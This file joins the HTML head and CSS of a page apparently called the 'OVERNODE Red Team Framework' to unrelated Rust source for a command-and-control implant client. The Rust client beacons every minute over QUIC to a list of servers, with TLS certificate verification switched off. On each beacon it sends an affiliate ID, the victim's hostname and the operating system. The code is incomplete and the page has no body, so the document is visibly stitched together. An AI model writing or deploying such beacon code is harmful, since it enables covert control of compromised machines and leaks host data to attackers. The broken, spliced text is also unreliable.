<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jackal Sec · OVERNODE Red Team Framework</title>
    <!-- Favicon (temporary wolf emoji – replace with custom .ico) -->
    <link rel="icon"
        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🐺</text></svg>">
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600;700;800&family=Syne:wght@700&display=swap"
        rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* ========== JACKAL SYSTEMS THEME ========== */
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #151b2b;
            --bg-tertiary: #1e2638;
            --bg-elevated: #252f45;
            --bg-hover: #2d3a55;
            --accent: #00d9ff;
            --accent-glow: rgba(0, 217, 255, 0.3);
            --text-primary: #e8edf4;
            --text-secondary: #8b94a8;
            --text-muted: #5f6b7f;
            --border-color: #1e2638;
            --border-hover: #2d3a55;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.5);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.6);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.7);
            --glow-accent: 0 0 20px var(--accent-glow);
            --transition-fast: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-normal: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Inter', sans-serif;
            height: 100vh;
            overflow: hidden;
            line-height: 1.6;
            position: relative;
        }

        /* Animated background grid */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image:
                linear-gradient(var(--border-color) 1px, transparent 1px),
                linear-gradient(90deg, var(--border-color) 1px, transparent 1px);
            background-size: 50px 50px;
            opacity: 0.2;
            animation: gridMove 20s linear infinite;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes gridMove {
            0% {
                transform: translateY(0);
            }

            100% {
                transform: translateY(50px);
            }
        }

        /* Gradient orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.1;
            z-index: 0;
            animation: float 8s ease-in-out infinite;
            pointer-events: none;
        }

        .orb-1 {
            width: 400px;
            height: 400px;
            background: var(--accent);
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }

        .orb-2 {
            width: 300px;
            height: 300px;
            background: #7000ff;
            bottom: -50px;
            left: -50px;
            animation-delay: 2s;
        }

        @keyframes float {

            0%,
            100% {
                transform: translate(0, 0) scale(1);
            }

            50% {
                transform: translate(30px, -30px) scale(1.1);
            }
        }

        /* Layout */
        .app-container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            position: relative;
            z-index: 1;
        }

        /* Top bar - matches Jackal Systems header */
        .top-bar {
            background: rgba(10, 14, 23, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid var(--accent);
            padding: 0.75rem 2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-family: 'JetBrains Mono', monospace;
            box-shadow: var(--shadow-md);
            position: relative;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 1.5rem;
        }

        /* Jackal SVG Logo */
        .jackal-logo {
            width: 2.5rem;
            height: 2.5rem;
            filter: drop-shadow(0 0 10px var(--accent-glow));
        }

        .jackal-logo path {
            fill: none;
            stroke: url(#gradient);
            stroke-width: 6;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .logo h1 {
            font-family: 'Syne', sans-serif;
            font-size: 1.8rem;
            background: linear-gradient(135deg, var(--text-primary) 0%, var(--accent) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.02em;
        }

        .stats-container {
            display: flex;
            gap: 2rem;
        }

        .stat-pill {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            padding: 0.4rem 1.2rem;
            border-radius: 30px;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            transition: var(--transition-fast);
            color: var(--text-secondary);
        }

        .stat-pill i {
            color: var(--accent);
        }

        .stat-pill:hover {
            border-color: var(--accent);
            box-shadow: var(--glow-accent);
            transform: translateY(-2px);
        }

        /* Main layout */
        .main-layout {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* Sidebar */
        .sidebar {
            width: 400px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            box-shadow: 4px 0 20px rgba(0, 0, 0, 0.5);
        }

        .sidebar-header {
            padding: 1.5rem;
            background: var(--bg-tertiary);
            border-bottom: 2px solid var(--accent);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .search-box {
            position: relative;
            margin-bottom: 1.2rem;
        }

        .search-box i {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        .search-box input {
            width: 100%;
            padding: 0.9rem 1rem 0.9rem 3rem;
            background: var(--bg-elevated);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            border-radius: 0;
            transition: var(--transition-fast);
        }

        .search-box input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: var(--glow-accent);
        }

        .filter-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 0.6rem;
        }

        .filter-tag {
            padding: 0.4rem 1.2rem;
            background: var(--bg-elevated);
            border: 1px solid var(--border-color);
            font-size: 0.8rem;
            cursor: pointer;
            transition: var(--transition-fast);
            border-radius: 20px;
            font-weight: 500;
            color: var(--text-secondary);
        }

        .filter-tag:hover {
            background: var(--bg-hover);
            border-color: var(--accent);
            color: var(--text-primary);
        }

        .filter-tag.active {
            background: var(--accent);
            border-color: var(--accent);
            color: var(--bg-primary);
        }

        .category-section {
            margin-bottom: 1rem;
        }

        .category-header {
            padding: 1rem 1.5rem;
            background: linear-gradient(90deg, var(--bg-tertiary), transparent);
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            font-weight: 700;
            text-transform: uppercase;
            border-left: 5px solid var(--accent);
            margin: 0.5rem 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: var(--transition-fast);
            letter-spacing: 1px;
        }

        .category-header:hover {
            background: var(--bg-hover);
            border-left-width: 8px;
        }

        .category-count {
            background: var(--bg-elevated);
            padding: 0.2rem 0.8rem;
            border-radius: 20px;
            font-size: 0.7rem;
            color: var(--text-secondary);
        }

        .case-item {
            padding: 1rem 1rem 1rem 3rem;
            cursor: pointer;
            border-left: 5px solid transparent;
            transition: all var(--transition-fast);
            border-bottom: 1px solid var(--border-color);
            position: relative;
            margin: 2px 0;
        }

        .case-item::before {
            content: '▶';
            position: absolute;
            left: 1.2rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            font-size: 0.8rem;
            transition: var(--transition-fast);
        }

        .case-item:hover {
            background: var(--bg-tertiary);
            border-left-color: var(--accent);
        }

        .case-item:hover::before {
            color: var(--accent);
        }

        .case-item.active {
            background: var(--bg-tertiary);
            border-left-color: var(--accent);
            box-shadow: inset 0 0 10px var(--accent-glow);
        }

        .case-item.active::before {
            color: var(--accent);
            content: '▼';
        }

        .case-name {
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 0.2rem;
            font-size: 1rem;
        }

        .case-meta {
            font-size: 0.7rem;
            color: var(--text-muted);
            display: flex;
            gap: 1rem;
        }

        .case-meta i {
            width: 12px;
            margin-right: 0.2rem;
            color: var(--accent);
        }

        /* Content Panel */
        .content-panel {
            flex: 1;
            overflow-y: auto;
            padding: 2rem;
            background: transparent;
            position: relative;
        }

        .case-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 2.8rem;
            font-weight: 800;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
            line-height: 1.2;
            text-shadow: var(--glow-accent);
            letter-spacing: -1px;
        }

        .case-subtitle {
            color: var(--accent);
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .threat-badge {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            padding: 0.4rem 1.2rem;
            font-size: 0.8rem;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            border-radius: 30px;
        }

        .threat-badge i {
            color: var(--accent);
        }

        .tags {
            display: flex;
            gap: 0.8rem;
            margin: 1.5rem 0;
            flex-wrap: wrap;
        }

        .tag {
            background: var(--bg-tertiary);
            padding: 0.3rem 1rem;
            font-size: 0.75rem;
            border-left: 3px solid var(--accent);
            border-radius: 0;
            font-weight: 500;
        }

        .story-section {
            background: var(--bg-secondary);
            border-left: 5px solid var(--accent);
            padding: 2rem;
            margin: 2rem 0;
            line-height: 1.8;
            position: relative;
            box-shadow: var(--shadow-md);
            border-radius: 0 8px 8px 0;
        }

        .story-section::before {
            content: '“';
            position: absolute;
            top: -20px;
            left: 20px;
            font-size: 4rem;
            color: var(--accent);
            opacity: 0.3;
            font-family: serif;
        }

        .technique-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 1.2rem;
            margin: 2rem 0;
        }

        .technique-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            padding: 1.5rem;
            transition: var(--transition-normal);
            position: relative;
            overflow: hidden;
        }

        .technique-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent), transparent);
            transform: translateX(-100%);
            transition: var(--transition-normal);
        }

        .technique-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg);
            border-color: var(--accent);
        }

        .technique-card:hover::before {
            transform: translateX(0);
        }

        .technique-name {
            color: var(--accent);
            font-weight: 700;
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
        }

        .code-block {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            margin: 2.5rem 0;
            overflow-x: auto;
            position: relative;
            box-shadow: var(--shadow-md);
        }

        .code-header {
            background: linear-gradient(90deg, var(--bg-tertiary), var(--bg-elevated));
            padding: 0.8rem 1.5rem;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }

        .code-language {
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .code-badge {
            background: var(--bg-elevated);
            padding: 0.2rem 0.8rem;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
        }

        .code-block pre {
            padding: 1.8rem;
            margin: 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: var(--text-primary);
            white-space: pre-wrap;
            word-wrap: break-word;
            background: var(--bg-primary);
            line-height: 1.6;
        }

        .enhanced-version {
            background: rgba(0, 217, 255, 0.1);
            border: 1px solid var(--accent);
            padding: 1.5rem;
            margin: 2rem 0;
            position: relative;
        }

        .enhanced-version::before {
            content: '⬆️ ENHANCED';
            position: absolute;
            top: -14px;
            left: 20px;
            background: var(--bg-primary);
            padding: 0 1rem;
            color: var(--accent);
            font-weight: bold;
            font-size: 0.9rem;
            letter-spacing: 1px;
        }

        .red-team-section {
            background: rgba(0, 217, 255, 0.05);
            border: 1px solid var(--accent);
            padding: 1.8rem;
            margin: 2rem 0;
            position: relative;
        }

        .red-team-section::before {
            content: '🔥 RED TEAM INSIGHTS';
            position: absolute;
            top: -14px;
            left: 20px;
            background: var(--bg-primary);
            padding: 0 1rem;
            color: var(--accent);
            font-weight: bold;
            font-size: 0.9rem;
        }

        .red-team-list {
            list-style: none;
            margin-top: 1rem;
        }

        .red-team-list li {
            margin-bottom: 0.8rem;
            padding-left: 1.8rem;
            position: relative;
        }

        .red-team-list li::before {
            content: '⚔️';
            color: var(--accent);
            position: absolute;
            left: 0;
            font-weight: bold;
        }

        .infra-diagram {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            padding: 2rem;
            margin: 2rem 0;
            font-family: 'JetBrains Mono', monospace;
            text-align: left;
            white-space: pre-wrap;
            border-left: 5px solid var(--accent);
        }

        .db-schema {
            background: var(--bg-elevated);
            border: 1px solid var(--accent);
            padding: 1.5rem;
            margin: 2rem 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }

        .db-schema h4 {
            color: var(--accent);
            margin-bottom: 0.5rem;
        }

        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 3rem;
            padding-top: 2rem;
            border-top: 1px solid var(--border-color);
        }

        .btn {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 0.8rem 2rem;
            font-family: 'JetBrains Mono', monospace;
            cursor: pointer;
            transition: var(--transition-fast);
            display: flex;
            align-items: center;
            gap: 0.8rem;
            font-size: 0.9rem;
        }

        .btn:hover:not(:disabled) {
            border-color: var(--accent);
            color: var(--accent);
            transform: translateX(-2px);
            box-shadow: var(--glow-accent);
        }

        .btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        .warning-box {
            background: rgba(0, 217, 255, 0.1);
            border: 1px solid var(--accent);
            padding: 1.8rem;
            margin: 2rem 0;
            position: relative;
        }

        .warning-box::before {
            content: '⚠️ AUTHORIZED USE ONLY';
            position: absolute;
            top: -14px;
            left: 20px;
            background: var(--bg-primary);
            padding: 0 1rem;
            color: var(--accent);
            font-weight: bold;
        }

        .loading-spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 3px solid var(--border-color);
            border-radius: 50%;
            border-top-color: var(--accent);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .toast-container {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
        }

        .toast {
            background: var(--bg-tertiary);
            border-left: 4px solid var(--accent);
            padding: 1rem 1.8rem;
            margin-top: 0.5rem;
            box-shadow: var(--shadow-lg);
            display: flex;
            align-items: center;
            gap: 1rem;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .sidebar {
                width: 350px;
            }

            .case-title {
                font-size: 2.2rem;
            }
        }

        @media (max-width: 768px) {
            .main-layout {
                flex-direction: column;
            }

            .sidebar {
                width: 100%;
                height: 300px;
            }

            .technique-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>

use std::sync::Arc;
use tokio::time;

pub struct C2Client {
    servers: Vec<String>,
    affiliate_id: String,
}

impl C2Client {
    pub fn new(servers: Vec<String>, affiliate_id: String) -> Self {
        Self { servers, affiliate_id }
    }

    pub async fn start(&self) {
        let mut interval = time::interval(time::Duration::from_secs(60)); // configurable
        loop {
            interval.tick().await;
            self.beacon().await;
        }
    }

    async fn beacon(&self) {
        for server in &self.servers {
            match self.connect_and_send(server).await {
                Ok(_) => {
                    info!("Beaconed to {}", server);
                    return;
                }
                Err(e) => error!("Failed to beacon to {}: {}", server, e),
            }
        }
    }

    async fn connect_and_send(&self, addr: &str) -> anyhow::Result<()> {
        let mut crypto = rustls::ClientConfig::builder()
            .with_safe_defaults()
            .with_custom_certificate_verifier(Arc::new(quinn::danger::SkipServerVerification::new()))
            .with_no_client_auth();
        crypto.alpn_protocols = vec!["hq-29".as_bytes().to_vec()];

        let client_config = ClientConfig::new(Arc::new(crypto));
        let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
        endpoint.set_default_client_config(client_config);

        let conn = endpoint.connect(addr.parse()?, "localhost")?.await?;
        let (mut send, mut recv) = conn.open_bi().await?;

        // Send affiliate ID and system info
        let hostname = hostname::get()?.to_string_lossy().to_string();
        let info = format!("{}|{}|{}", self.affiliate_id, hostname, std::env::consts::OS);
        send.write_all(info.as_bytes()).await?;
        send.finish().await?;

        // Wait for ack
        let _ = recv.read_to_end(1024).await?;
        Ok(())
    }
